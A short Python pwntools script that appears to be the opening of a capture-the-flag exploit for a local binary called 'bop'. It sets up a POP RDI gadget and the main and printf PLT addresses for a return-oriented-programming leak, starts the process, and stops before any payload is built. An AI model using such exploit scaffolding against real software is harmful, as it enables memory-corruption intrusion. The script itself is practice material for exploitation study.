from pwn import *

e = ELF('bop')

POP_RDI = 0x00000000004013d3
MAIN_PLT = e.symbols['main']
PRINTF_PLT = e.plt['printf']

context.binary = e

p = process(e.path)
p.recvuntil(b'?')